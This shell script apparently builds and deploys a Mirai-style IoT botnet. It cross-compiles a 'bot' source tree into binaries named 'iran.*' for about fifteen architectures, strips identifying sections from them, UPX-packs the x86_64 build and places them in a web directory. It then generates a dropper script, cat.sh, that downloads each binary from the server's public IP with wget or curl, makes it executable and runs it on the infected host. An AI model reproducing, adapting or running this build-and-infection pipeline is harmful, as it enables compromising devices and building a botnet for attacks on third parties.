#!/bin/sh
export PATH=/etc/xcompile/x86_64/bin:/etc/xcompile/powerpc/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/etc/xcompile/armv4l/bin:/etc/xcompile/armv5l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/armv7l/bin:/etc/xcompile/sh4/bin:/etc/xcompile/arc/bin:/etc/xcompile/csky-gcc/bin:/etc/xcompile/aarch64/bin:/etc/xcompile/m68k/bin:/etc/xcompile/sparc/bin:/etc/xcompile/i486/bin:$PATH


cd bot

# Build for each arch
powerpc-gcc *.c -o iran.powerpc -DARCH_powerpc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mips-gcc *.c -o iran.mips -DARCH_mips -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mips-gcc *.c -o iran.mipsrouter -DKILLER_OFF -DARCH_mipsrouter -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
mipsel-gcc *.c -o iran.mipsel -DARCH_mipsel -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
x86_64-gcc *.c -o iran.x86_64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_x86_64 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
m68k-gcc *.c -o iran.m68k -DARCH_m68k -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
sparc-gcc *.c -o iran.sparc -DARCH_sparc -lpthread -O3 -fomit-frame-pointer -fdata-sections -std=c99 -static-libgcc
i486-gcc *.c -o iran.i486 -DARCH_i486 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
aarch64-linux-gcc *.c -o iran.aarch64 -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_aarch64 -pthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv4l-gcc *.c -o iran.armv4l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv4l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv5l-gcc *.c -o iran.armv5l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv5l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv6l-gcc *.c -o iran.armv6l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv6l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
armv7l-gcc *.c -o iran.armv7l -fno-stack-protector -fno-ident -fno-asynchronous-unwind-tables -DARCH_armv7l -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static
sh4-gcc *.c -o iran.sh4 -DARCH_sh4 -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -s -std=c99 -static
arc-linux-gcc *.c -o iran.arc -DARCH_arc -lpthread -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -std=c99 -static

# strip bins
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.powerpc
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.mipsel
i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.i486
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.x86_64
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.m68k
sparc-strip -S --strip-unneeded iran.sparc
aarch64-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.aarch64
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv4l
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv5l
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.armv6l
armv7l-strip -S --strip-unneeded -R .comment -R .note -R .note.gnu.build-id -R .note.gnu.gold-version iran.armv7l
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.sh4
arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr iran.arc

#compress
upx --lzma iran.x86_64
#upx --lzma iran.aarch64
#upx --lzma iran.armv4l
#upx --lzma iran.armv5l
#upx --lzma iran.armv6l
#upx --lzma iran.armv7l
#upx --lzma iran.mips
#upx --lzma iran.mipsel
#upx --lzma iran.mipsrouter

# Move binaries to web dir
mv iran.* /var/www/html

cd ..

IP=$(curl -s ifconfig.co)
cat <<EOF >/var/www/html/cat.sh
#!/bin/sh
wget http://$IP/iran.x86_64 || curl http://$IP/iran.x86_64 -o iran.x86_64; chmod 777 iran.x86_64; ./iran.x86_64 "$@" ;
wget http://$IP/iran.aarch64 || curl http://$IP/iran.aarch64 -o iran.aarch64; chmod 777 iran.aarch64; ./iran.aarch64 "$@" ;
wget http://$IP/iran.m68k || curl http://$IP/iran.m68k -o iran.m68k; chmod 777 iran.m68k; ./iran.m68k "$@" ;
wget http://$IP/iran.mips || curl http://$IP/iran.mips -o iran.mips; chmod 777 iran.mips; ./iran.mips "$@" ;
wget http://$IP/iran.mipsel || curl http://$IP/iran.mipsel -o iran.mipsel; chmod 777 iran.mipsel; ./iran.mipsel "$@" ;
wget http://$IP/iran.powerpc || curl http://$IP/iran.powerpc -o iran.powerpc; chmod 777 iran.powerpc; ./iran.powerpc "$@" ;
wget http://$IP/iran.sparc || curl http://$IP/iran.sparc -o iran.sparc; chmod 777 iran.sparc; ./iran.sparc "$@" ;
wget http://$IP/iran.sh4 || curl http://$IP/iran.sh4 -o iran.sh4; chmod 777 iran.sh4; ./iran.sh4 "$@" ;
wget http://$IP/iran.arc || curl http://$IP/iran.arc -o iran.arc; chmod 777 iran.arc; ./iran.arc "$@" ;
wget http://$IP/iran.i486 || curl http://$IP/iran.i486 -o iran.i486; chmod 777 iran.i486; ./iran.i486 "$@" ;
wget http://$IP/iran.armv4l || curl http://$IP/iran.armv4l -o iran.armv4l; chmod 777 iran.armv4l; ./iran.armv4l "$@" ;
wget http://$IP/iran.armv5l || curl http://$IP/iran.armv5l -o iran.armv5l; chmod 777 iran.armv5l; ./iran.armv5l "$@" ;
wget http://$IP/iran.armv6l || curl http://$IP/iran.armv6l -o iran.armv6l; chmod 777 iran.armv6l; ./iran.armv6l "$@" ;
wget http://$IP/iran.armv7l || curl http://$IP/iran.armv7l -o iran.armv7l; chmod 777 iran.armv7l; ./iran.armv7l "$@" ;
EOF

echo "DONE!"

exit 0
